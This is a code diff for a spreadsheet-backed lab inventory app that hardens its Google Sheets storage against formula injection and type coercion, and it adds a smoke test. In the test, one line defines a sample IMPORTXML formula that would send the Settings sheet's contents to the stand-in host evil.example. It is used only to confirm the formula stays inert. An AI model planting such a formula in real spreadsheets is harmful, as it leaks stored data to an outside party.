@@ -969,6 +969,12 @@ function getOrCreateSheet(name, headers) {
 // Every rule in this file is written against strings, so the coercion has to be
 // undone in exactly one place — here — and every reader has to go through it.
 // test-sheets-coercion.js is the file that keeps that honest.
+// Fields whose value is text and must stay the text that was typed. Deliberately
+// excludes qty/minQty, which are numbers, and out/ret/date/fromTime/toTime, which
+// are stored as real dates so the tabs stay sortable by a human and converted back
+// on the way out.
+var TEXT_FIELDS_ = ["name","loc","cat","desc","serial","unit","status","displayId","tags","item","store","requestedBy","reason","link","from","receivedBy","tracking","user","checkedOutByEmail","groupEmails","requestedByEmail","notes"];
+
 function normalizeRow_(headers, row) {
   var pad = function (n) { return String(n).padStart(2, "0"); };
   var ymd = function (d) { return d.getFullYear() + "-" + pad(d.getMonth() + 1) + "-" + pad(d.getDate()); };
@@ -994,14 +1000,13 @@ function normalizeRow_(headers, row) {
     if (h === "id" || h === "itemId") { val = val === "" || val == null ? (h === "itemId" ? "" : String(val)) : String(val); }
     // Ensure text fields are strings — Sheets auto-detects numbers in text cells
     // (e.g. a serial number "12345678" returns as the JS number 12345678)
-    var textFields = ["name","loc","cat","desc","serial","unit","status","displayId","tags","item","store","requestedBy","reason","link","from","receivedBy","tracking","user","checkedOutByEmail","groupEmails","requestedByEmail","notes"];
-    if (textFields.indexOf(h) >= 0 && typeof val !== "string") {
+    if (TEXT_FIELDS_.indexOf(h) >= 0 && typeof val !== "string") {
       val = val == null ? "" : String(val);
     }
     // Undo serializeCell_'s formula guard. Sheets normally eats the apostrophe
     // itself, so this usually finds nothing; doing it anyway means the value the
     // app reads is the value it wrote, whichever way the API behaves.
-    if (typeof val === "string" && val.charAt(0) === "'" && FORMULA_LEAD_.test(val.slice(1))) val = val.slice(1);
+    if (typeof val === "string" && val.charAt(0) === "'" && reparsed_(val.slice(1))) val = val.slice(1);
     // Datetime fields — Sheets turns "YYYY-MM-DD HH:MM" into a Date object
     if (["out", "ret"].indexOf(h) >= 0) {
       if (val instanceof Date) val = ymd(val) + " " + hm(val);
@@ -1076,11 +1081,49 @@ function findRow(name, match) {
 // value; normalizeRow_ strips one anyway if it comes back, so the round trip is
 // exact whichever way the API behaves.
 var FORMULA_LEAD_ = /^[=+\-@\t\r]/;
+
+// A leading apostrophe is guarded too, because it is Sheets' own text marker and
+// is eaten on the way in: "'tis a scope" would come back as "tis a scope". Writing
+// two means one survives.
+//
+// Escaping it also makes the round trip correct without having to know whether the
+// API returns the marker or swallows it — the two are mutually exclusive and the
+// code used to hedge both ways. Written this way, both land on the original value:
+// if the marker is eaten, the cell holds exactly what was passed and the read below
+// finds nothing to strip; if it is kept, the read strips the one that was added.
+// (A value that genuinely starts with two apostrophes loses one. Noted, not fixed.)
+var NEEDS_GUARD_ = /^['=+\-@\t\r]/;
+
+// Sheets parses every string it is given, and a text field only stays the text
+// that was typed if what was typed does not look like something else. A serial
+// number "0012345678" is a number to a spreadsheet, and the leading zeros are gone
+// for good; "09:00" is a time and comes back as a Date in 1899; "TRUE" is a
+// boolean. The apostrophe that keeps formulas inert keeps these intact too.
+function reparsed_(val) {
+  if (typeof val !== "string" || val === "") return false;
+  if (NEEDS_GUARD_.test(val)) return true;                  // a formula, or our own marker
+  if (/^-?\d+(\.\d+)?$/.test(val)) return true;             // 0012345678 → 12345678
+  if (/^\d{1,2}:\d{2}(:\d{2})?$/.test(val)) return true;    // 09:00 → 1899-12-30T09:00
+  if (/^\d{4}-\d{1,2}-\d{1,2}/.test(val)) return true;      // 2026-09-01 → a Date
+  if (/^\d{1,2}\/\d{1,2}\/\d{2,4}$/.test(val)) return true; // 9/1/2026 → a Date
+  if (/^(TRUE|FALSE)$/i.test(val)) return true;             // → a boolean
+  return false;
+}
+
+// The guard on its own, for the writes that aren't record fields — the purchase
+// summary sheet and Settings. Anything that reaches a cell goes through this.
+function guardText_(val) {
+  if (typeof val === "string" && NEEDS_GUARD_.test(val)) return "'" + val;
+  return val;
+}
+
 function serializeCell_(header, val) {
   if (header === "usedBy" && Array.isArray(val)) return JSON.stringify(val);
   if (val === undefined || val === null) return "";
-  if (typeof val === "string" && FORMULA_LEAD_.test(val)) return "'" + val;
-  return val;
+  // Text fields get the wider guard; everywhere else only formulas are held back,
+  // because a date column is meant to hold a date and a qty column a number.
+  if (TEXT_FIELDS_.indexOf(header) >= 0 && reparsed_(val)) return "'" + val;
+  return guardText_(val);
 }
 
 // The sheet's own header row is authoritative for writes, not TABLE_HEADERS.
@@ -1113,10 +1156,15 @@ function appendRow(name, obj) {
 function updateRow(name, match, patch) {
   var hit = locateRow_(name, match);
   if (!hit) return null;
-  var row = hit.raw.slice();
-  Object.keys(patch).forEach(function(f) {
-    var col = hit.headers.indexOf(f);
-    if (col >= 0 && patch[f] !== undefined) row[col] = serializeCell_(f, patch[f]);
+  // Every cell is re-serialized, not just the patched ones. getValues() hands back
+  // an apostrophe-guarded cell as plain text — the apostrophe is a formatting mark,
+  // not part of the value — so writing the untouched cells straight back would give
+  // setValues a live "=IMPORTXML(…)". Editing an item's quantity would arm a name
+  // that was safely inert on the way in.
+  var has = Object.prototype.hasOwnProperty;
+  var row = hit.headers.map(function (h, i) {
+    var patched = has.call(patch, h) && patch[h] !== undefined;
+    return serializeCell_(h, patched ? patch[h] : hit.raw[i]);
   });
   hit.sheet.getRange(hit.rowNum, 1, 1, row.length).setValues([row]);
   return hit.obj;
@@ -1165,11 +1213,11 @@ function writeSetting(key, value) {
   var data = sheet.getDataRange().getValues();
   for (var i = 1; i < data.length; i++) {
     if (String(data[i][0]) === String(key)) {
-      sheet.getRange(i + 1, 2).setValue(value);
+      sheet.getRange(i + 1, 2).setValue(guardText_(value));
       return;
     }
   }
-  sheet.appendRow([key, value]);
+  sheet.appendRow([guardText_(key), guardText_(value)]);
 }
 
 function jsonResponse(data) {
@@ -1778,13 +1826,16 @@ function doPost(e) {
     var dataRows = orders.map(function(o) {
       var qty = parseFloat(o.qty) || 0;
       var price = parseFloat(String(o.price || "").replace(/[^0-9.]/g, "")) || null;
+      // item, link and store are whatever the requester typed. They are inert in
+      // the Orders tab because appendRow guards them, but this sheet is built from
+      // scratch and an admin opens it — so guard them again on the way in here.
       return [
         qty || o.qty || "",
-        o.item || "",
+        guardText_(o.item || ""),
         price !== null ? price : "",  // numeric — formatted as currency below
         "",                           // Total: filled with formula per row below
-        o.link || "",
-        o.store || ""
+        guardText_(o.link || ""),
+        guardText_(o.store || "")
       ];
     });
 
@@ -1885,4 +1936,147 @@ function updateItemStatus(itemId, itemName, userName, mode) {
   }
 
   updateRow("Items", target, patch);
+}
+
+// ─── Smoke test ──────────────────────────────────────────────────────────────
+// Run this from the editor once, after setupNewLab(). Everything else is tested
+// against a simulated spreadsheet, and a simulated spreadsheet gives back the
+// JavaScript value it was handed. A real one does not: it parses what you write.
+// "09:00" becomes a time and reads back as a Date in 1899, "12345678" becomes a
+// number, and text beginning with = is a formula that runs when somebody opens
+// the file. Several fields survive that round trip only because normalizeRow_
+// undoes it, and this is the only place that claim is checked against the real
+// thing rather than against a model of it.
+//
+// It writes rows whose ids begin with ZZSMOKE and deletes them again, including
+// when an assertion fails. It never touches Settings, never writes to AuditLog,
+// DeleteLog or Slack, and never changes a row it did not create. Running it on a
+// sheet that already holds real inventory is safe.
+var SMOKE_ = "ZZSMOKE";
+
+function smokePurge_() {
+  var n = 0, tables = ["Items", "Checkouts", "Deliveries", "Orders"];
+  var mine = function (r) { return String(r.id).indexOf(SMOKE_) === 0; };
+  for (var t = 0; t < tables.length; t++) {
+    for (var guard = 0; guard < 50; guard++) {
+      if (!deleteRow(tables[t], mine)) break;
+      n++;
+    }
+  }
+  return n;
+}
+
+function smokeTest() {
+  var out = [], pass = 0, fail = 0;
+  function ok(label, cond, got) {
+    if (cond) { pass++; out.push("  ok    " + label); }
+    else { fail++; out.push("  FAIL  " + label + "\n          got " + JSON.stringify(got)); }
+  }
+
+  smokePurge_();   // in case an earlier run died before its cleanup
+  try {
+    out.push("— schema —");
+    Object.keys(TABLE_HEADERS).forEach(function (name) {
+      var sheet = getSheet(name);
+      if (!sheet) { ok("tab " + name + " exists", false, null); return; }
+      var have = sheetHeaders_(sheet, name).map(String);
+      var missing = TABLE_HEADERS[name].filter(function (h) { return have.indexOf(h) < 0; });
+      ok("tab " + name + " has every column", missing.length === 0, missing);
+    });
+
+    out.push("— what Sheets does to an item on the way in —");
+    var EVIL = '=IMPORTXML("https://evil.example/?d="&JOIN(",",Settings!A1:B99),"//a")';
+    appendRow("Items", {
+      id: SMOKE_ + "-0012",          // leading zero — must not come back as 12
+      name: EVIL,                    // formula-shaped — must stay inert text
+      cat: "Sensors & Vision", qty: 5, unit: "pcs", loc: "Hackerman 123",
+      minQty: 2, img: "", desc: "'tis a smoke test",   // leading apostrophe
+      status: "Available",
+      usedBy: ["Alice", "Bob"],      // array — must survive as an array
+      serial: "0012345678",          // all digits — must stay a string
+      displayId: SMOKE_ + "-A-001", shared: true, consumable: false,
+    });
+
+    var hit = locateRow_("Items", SMOKE_ + "-0012");
+    ok("the item round-trips at all", !!hit, null);
+    if (hit) {
+      var it = hit.obj, rawName = hit.raw[hit.headers.indexOf("name")];
+      ok("id keeps its leading zero",        it.id === SMOKE_ + "-0012", it.id);
+      ok("formula-shaped name stays text",   it.name === EVIL, it.name);
+      ok("the formula did not evaluate",     typeof rawName === "string" && rawName.indexOf("IMPORTXML") > 0, rawName);
+      ok("leading apostrophe survives",      it.desc === "'tis a smoke test", it.desc);
+      ok("qty is a number",                  it.qty === 5, it.qty);
+      ok("minQty is a number",               it.minQty === 2, it.minQty);
+      ok("all-digit serial stays a string",  it.serial === "0012345678", it.serial);
+      ok("usedBy is an array of two",        Object.prototype.toString.call(it.usedBy) === "[object Array]" && it.usedBy.length === 2, it.usedBy);
+      ok("shared reads back true",           it.shared === true || String(it.shared) === "true", it.shared);
+      ok("consumable reads back false",      !it.consumable, it.consumable);
+      // Settles a question a simulated sheet cannot answer: getValues() either
+      // returns the apostrophe serializeCell_ wrote or Sheets ate it. The guard is
+      // written to land on the original value either way; this records which it is.
+      out.push("  note  guarded cell reads back as: " + JSON.stringify(rawName).slice(0, 60));
+    }
+
+    out.push("— editing one field must not arm the others —");
+    var before = updateRow("Items", SMOKE_ + "-0012", { qty: 7, loc: "Hackerman 200" });
+    ok("updateRow returns the row as it was", before && before.qty === 5, before && before.qty);
+    var after = findRow("Items", SMOKE_ + "-0012");
+    var rawAfter = locateRow_("Items", SMOKE_ + "-0012");
+    rawAfter = rawAfter && rawAfter.raw[rawAfter.headers.indexOf("name")];
+    ok("the patch applied",                after && after.qty === 7 && after.loc === "Hackerman 200", after && [after.qty, after.loc]);
+    ok("the name did not become a formula", typeof rawAfter === "string" && rawAfter.indexOf("IMPORTXML") > 0, rawAfter);
+    ok("untouched columns are unchanged",  after && after.name === EVIL && after.serial === "0012345678"
+                                             && after.desc === "'tis a smoke test" && after.usedBy.length === 2,
+                                           after && [after.name, after.serial, after.desc, after.usedBy]);
+
+    out.push("— what Sheets does to a booking —");
+    appendRow("Checkouts", {
+      id: SMOKE_ + "-CO-1", itemId: SMOKE_ + "-0012", item: EVIL, user: "Smoke Tester",
+      out: "2026-09-01 09:00", ret: "2026-09-03 17:00",    // parsed into Dates by Sheets
+      status: "Active", checkedOutByEmail: "smoke@jh.edu", groupEmails: "", qty: 1,
+      fromTime: "09:00", toTime: "17:00",                  // parsed into 1899 Dates
+      notes: "",
+    });
+    var c = findRow("Checkouts", SMOKE_ + "-CO-1");
+    ok("the booking round-trips at all", !!c, null);
+    if (c) {
+      ok("out is a string, not a Date",   c.out === "2026-09-01 09:00", c.out);
+      ok("ret is a string, not a Date",   c.ret === "2026-09-03 17:00", c.ret);
+      ok("fromTime survives as HH:MM",    c.fromTime === "09:00", c.fromTime);
+      ok("toTime survives as HH:MM",      c.toTime === "17:00", c.toTime);
+      ok("itemId stays a string",         c.itemId === SMOKE_ + "-0012", c.itemId);
+      // The payoff. Every booking rule is written against strings, and each of the
+      // four values above reaches them straight off the sheet. When fromTime came
+      // back as a Date, minutes_() returned null, "no window" meant all day, and
+      // every daily booking silently became a 24-hour hold that blocked the item.
+      ok("minutes_ parses the window off the sheet", minutes_(c.fromTime) === 540 && minutes_(c.toTime) === 1020,
+                                                     [minutes_(c.fromTime), minutes_(c.toTime)]);
+      ok("bookingMs_ parses the dates off the sheet", bookingMs_(c.out) !== null && bookingMs_(c.ret) !== null,
+                                                      [bookingMs_(c.out), bookingMs_(c.ret)]);
+      ok("badRange_ accepts a good booking",         badRange_(c) === "", badRange_(c));
+      ok("a future booking does not hold the item",  bookingHoldsItem_(c) === false, bookingHoldsItem_(c));
+      ok("bookingsClash_ agrees with itself",        bookingsClash_(c, c) === true, false);
+    }
+
+    out.push("— readTable sees what findRow sees —");
+    var fromTable = readTable("Items").filter(function (r) { return r.id === SMOKE_ + "-0012"; })[0];
+    ok("readTable returns the row too", !!fromTable, null);
+    ok("and normalizes it identically", fromTable && JSON.stringify(fromTable) === JSON.stringify(findRow("Items", SMOKE_ + "-0012")),
+                                        fromTable && fromTable.name);
+
+  } catch (err) {
+    fail++;
+    out.push("  FAIL  threw: " + err.message + "\n" + (err.stack || ""));
+  } finally {
+    var removed = smokePurge_();
+    out.push("— cleanup —");
+    out.push("  removed " + removed + " test row(s)");
+  }
+
+  var head = fail === 0
+    ? "✅ smoke test: " + pass + " passed"
+    : "❌ smoke test: " + pass + " passed, " + fail + " FAILED";
+  var report = head + "\n" + out.join("\n");
+  Logger.log(report);
+  return report;
 }
